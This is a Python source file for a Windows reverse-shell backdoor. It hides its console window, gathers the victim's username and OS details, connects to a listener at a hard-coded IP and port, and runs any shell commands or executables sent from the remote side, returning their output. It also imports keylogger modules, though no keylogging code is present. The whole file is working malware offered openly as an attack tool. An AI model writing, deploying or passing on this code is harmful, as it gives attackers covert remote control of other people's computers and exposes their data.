from socket import *
from getpass import getuser
import subprocess
import platform
import os
import win32console
import win32gui
# keylogger modules
import sys
import win32api,pythoncom
import pyHook,time,random,string,base64
from _winreg import *

# hiding the payload
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
# fetch victim information
debug_mode = True
get_os = platform = platform.uname()

get_user = getuser()

os_info = '[OS INFO] client_name: '+str(get_user)+' <-> '+'client_os: '+str(get_os)
# Lhost and lport

HOST = '192.168.18.16'

PORT = 444
# connection configuration

connection = socket(AF_INET, SOCK_STREAM)

connection.connect((HOST, PORT))

connection.send(os_info.encode())
# payload execution

while True:
    receiver = connection.recv(1024).decode()
    if receiver == 'exit':
        exit()
    elif receiver[:2] == 'cd':
        os.chdir(receiver[3:])
        connection.send(os.getcwd().encode())
    elif ".exe" in receiver:
        warning = "(!) Executing "+receiver
        connection.send(warning.encode())
        result = subprocess.run(receiver, shell=True, capture_output=True)
        # Print the output of the command
        # connection.send(result)
        statement = "done !"
        connection.send(statement.encode())
    else:
        out_put = subprocess.getoutput(receiver)
        statement = "Executing command:" + receiver+'\n'
        if out_put =='' or out_put == None:
            output='---'
            connection.send(statement.encode())
            connection.send(out_put.encode())
        else:
            connection.send(statement.encode())
            connection.send(out_put.encode())